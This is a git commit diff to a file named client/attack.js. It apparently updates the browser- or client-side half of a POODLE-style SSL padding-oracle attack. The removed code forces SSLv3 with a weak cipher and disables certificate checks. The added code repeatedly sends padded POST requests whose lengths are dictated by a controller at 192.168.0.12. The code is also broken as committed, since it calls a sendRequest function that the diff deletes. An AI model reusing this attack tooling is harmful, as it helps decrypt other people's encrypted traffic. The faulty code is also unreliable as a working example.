406ce032a07eb1ade5e010992c0c387b0444d81c
GoRuGoo <goru.technology@gmail.com>
2025-01-15 07:35:02 +0900

    feat: JSを新しいPythonコードに合わせるように更新

--- client/attack.js
+++ client/attack.js
@@ -1,65 +1,56 @@
-const https = require('https');
-const url = require('url');  // URLモジュールを使ってURLをパースします
+const https = require('http');
+const url = require('url');
 
-function sendRequest(method, urlStr, data, callback, errorcallback, timeout, options) {
-    // URLからホスト名とパスを抽出
-    const parsedUrl = url.parse(urlStr);  // Node.js v0.12.18ではurl.parseを使用
-    options.hostname = parsedUrl.hostname;
-    options.path = parsedUrl.path;
-    options.method = method || 'GET';
-    options.headers = options.headers || {};
+var urllen = 0;
+var postlen = 26;
+var delay = 10;
 
-    // Content-Lengthヘッダを設定（dataがある場合）
-    if (data) {
-        options.headers['Content-Length'] = Buffer.byteLength(data);
+function strPad(n) {
+    if (n > 0) {
+        return Array(n + 1).join("A");
+    } else {
+        return "";
     }
-
-    // リクエストを作成
-    const req = https.request(options, function (res) {
-        var responseData = '';
-
-        // レスポンスデータを収集
-        res.on('data', function (chunk) {
-            responseData += chunk;
-        });
-
-        // レスポンス終了後にコールバックを呼ぶ
-        res.on('end', function () {
-            callback && callback(responseData);
-        });
-    });
-
-    // エラーハンドリング
-    req.on('error', function (err) {
-        errorcallback && errorcallback(err.code, err.message);
-    });
-
-    // タイムアウト設定
-    req.setTimeout(timeout || 5000, function () {
-        req.abort(); // タイムアウト時にリクエストを中断
-        errorcallback && errorcallback('ETIMEDOUT', 'Request timed out');
-    });
-
-    // データがあれば送信
-    if (data) {
-        req.write(Array(101).join('a') + data); // Content-Length最小100バイトになるようにする
-    }
-
-    // リクエスト送信
-    req.end();
 }
 
-// リクエストを送信する部分
-const options = {
-    hostname: 'testdomain.com',
-    port: 443,
-    ciphers: 'DES-CBC3-SHA',
-    secureProtocol: 'SSLv3_method',
-    rejectUnauthorized: false
-};
 
-sendRequest('GET', 'https://testdomain.com', null, function (response) {
-    console.log('レスポンス: ', response);
-}, function (errorCode, errorMessage) {
-    console.error('エラー: ', errorCode, errorMessage);
-}, 5000, options);
+function performSSLRequest() {
+    const paddedUrl = "https://testdomain.com" + strPad(urllen);
+    const postData = strPad(postlen);
+
+    sendRequest(
+        'POST',
+        paddedUrl,
+        postData,
+        function (response) {
+            // On successful POST, proceed to query the next request
+            queryNextRequest();
+        },
+        function (errorCode, errorMessage) {
+            console.error("Error in performSSLRequest:", errorCode, errorMessage);
+        },
+        5000
+    );
+}
+
+function queryNextRequest() {
+    sendRequest(
+        'GET',
+        "http://192.168.0.12/nextRequest",
+        null,
+        function (response) {
+            const res = response.split(":");
+            urllen = Number(res[0]);
+            postlen = Number(res[1]);
+
+            // Schedule the next SSL request after a delay
+            setTimeout(performSSLRequest, delay);
+        },
+        function (errorCode, errorMessage) {
+            console.error("Error in queryNextRequest:", errorCode, errorMessage);
+        },
+        5000
+    );
+}
+
+performSSLRequest();
